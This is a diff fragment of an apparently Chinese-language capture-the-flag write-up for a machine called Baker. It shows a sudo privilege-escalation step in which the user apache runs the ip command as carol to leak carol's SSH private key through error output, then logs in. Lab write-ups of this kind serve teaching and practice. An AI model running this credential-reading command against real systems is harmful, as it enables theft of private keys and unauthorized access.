@@ -492,7 +492,8 @@ User apache may run the following commands on Baker:
 ```
 能以`carol`用户权限执行ip，这有啥用呀。
 找到CTFOBins里面有ip命令的文件读取，我们试一下读ssh密钥。
-
+![](file-20260510144234572.png)
+记得加速用户
 ```bash
 /var/www/localhost/htdocs/pages $ sudo -u carol ip -force -batch /home/carol/.ssh/id_rsa 2>&1
 Object "-----BEGIN" is unknown, try "ip help".
@@ -572,6 +573,8 @@ Command failed /home/carol/.ssh/id_rsa:37
 Object "-----END" is unknown, try "ip help".
 Command failed /home/carol/.ssh/id_rsa:38
 ```
+这里可以直接给ai帮我们提取一下。
+
 读到ssh密钥，登录成功
 ```bash
 ┌──(kali㉿kali)-[~/tmp/tmp]
